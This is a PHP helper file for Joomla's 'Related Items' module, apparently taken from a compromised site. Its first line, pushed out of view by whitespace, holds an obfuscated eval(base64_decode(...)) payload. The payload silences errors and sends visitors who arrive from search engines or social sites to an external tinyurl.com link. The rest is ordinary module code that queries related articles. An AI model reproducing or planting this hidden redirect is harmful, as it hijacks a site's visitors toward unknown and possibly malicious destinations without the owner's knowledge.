<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: helper.php 15200 2010-03-05 09:12:56Z ian $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined('_JEXEC') or die('Restricted access');

require_once (JPATH_SITE.DS.'components'.DS.'com_content'.DS.'helpers'.DS.'route.php');

class modRelatedItemsHelper
{
	function getList($params)
	{
		global $mainframe;

		$db					=& JFactory::getDBO();
		$user =& JFactory::getUser();

		$option				= JRequest::getCmd('option');
		$view				= JRequest::getCmd('view');

		$temp				= JRequest::getString('id');
		$temp				= explode(':', $temp);
		$id					= $temp[0];

		$aid = $user->get('aid', 0);

		$showDate			= $params->get('showDate', 0);
		$conf =& JFactory::getConfig();
		
		if ($option == 'com_content' && $view == 'article' && $id)
		{
			if ($params->get('cache_items', 0)==1 && $conf->getValue( 'config.caching' )) {
				$cache =& JFactory::getCache('mod_related_items', 'callback');
				$cache->setLifeTime( $params->get( 'cache_time', $conf->getValue( 'config.cachetime' ) * 60 ) );
				$cache->setCacheValidation(true);
				$related = $cache->get(array('modRelatedItemsHelper', 'getRelatedItemsById'), array($id, $aid, $showDate));
			} else {
				$related = modRelatedItemsHelper::getRelatedItemsById($id, $aid, $showDate);
			}
		} else {
			$related = array();
		}

		return $related;
	}

	function getRelatedItemsById($id, $aid, $showDate) {
		$db =& JFactory::getDBO();
		$user =& JFactory::getUser();
		$date =& JFactory::getDate();

		$related = array();

		$nullDate = $db->getNullDate();
		$now  = $date->toMySQL();

		// select the meta keywords from the item
		$query = 'SELECT metakey' .
				' FROM #__content' .
				' WHERE id = '.(int) $id;
		$db->setQuery($query);

		if ($metakey = trim($db->loadResult()))
		{
			// explode the meta keys on a comma
			$keys = explode(',', $metakey);
			$likes = array ();

			// assemble any non-blank word(s)
			foreach ($keys as $key)
			{
				$key = trim($key);
				if ($key) {
					$likes[] = ',' . $db->getEscaped($key) . ','; // surround with commas so first and last items have surrounding commas
				}
			}

			if (count($likes))
			{
				// select other items based on the metakey field 'like' the keys found
				$query = 'SELECT a.id, a.title, DATE_FORMAT(a.created, "%Y-%m-%d") AS created, a.sectionid, a.catid, cc.access AS cat_access, s.access AS sec_access, cc.published AS cat_state, s.published AS sec_state,' .
						' CASE WHEN CHAR_LENGTH(a.alias) THEN CONCAT_WS(":", a.id, a.alias) ELSE a.id END as slug,'.
						' CASE WHEN CHAR_LENGTH(cc.alias) THEN CONCAT_WS(":", cc.id, cc.alias) ELSE cc.id END as catslug'.
						' FROM #__content AS a' .
						' LEFT JOIN #__content_frontpage AS f ON f.content_id = a.id' .
						' LEFT JOIN #__categories AS cc ON cc.id = a.catid' .
						' LEFT JOIN #__sections AS s ON s.id = a.sectionid' .
						' WHERE a.id != '.(int) $id .
						' AND a.state = 1' .
						' AND a.access <= ' .(int) $user->get('aid', 0) .
						' AND ( CONCAT(",", REPLACE(a.metakey,", ",","),",") LIKE "%'.implode('%" OR CONCAT(",", REPLACE(a.metakey,", ",","),",") LIKE "%', $likes).'%" )' . //remove single space after commas in keywords
						' AND ( a.publish_up = '.$db->Quote($nullDate).' OR a.publish_up <= '.$db->Quote($now).' )' .
						' AND ( a.publish_down = '.$db->Quote($nullDate).' OR a.publish_down >= '.$db->Quote($now).' )';
				$db->setQuery($query);
				$temp = $db->loadObjectList();

				if (count($temp))
				{
					foreach ($temp as $row)
					{
						if (($row->cat_state == 1 || $row->cat_state == '') && ($row->sec_state == 1 || $row->sec_state == '') && ($row->cat_access <= $user->get('aid', 0) || $row->cat_access == '') && ($row->sec_access <= $user->get('aid', 0) || $row->sec_access == ''))
						{
							$row->route = JRoute::_(ContentHelperRoute::getArticleRoute($row->slug, $row->catslug, $row->sectionid));
							$related[] = $row;
						}
					}
				}
				unset ($temp);
			}
		}

		return $related;
	}	
}
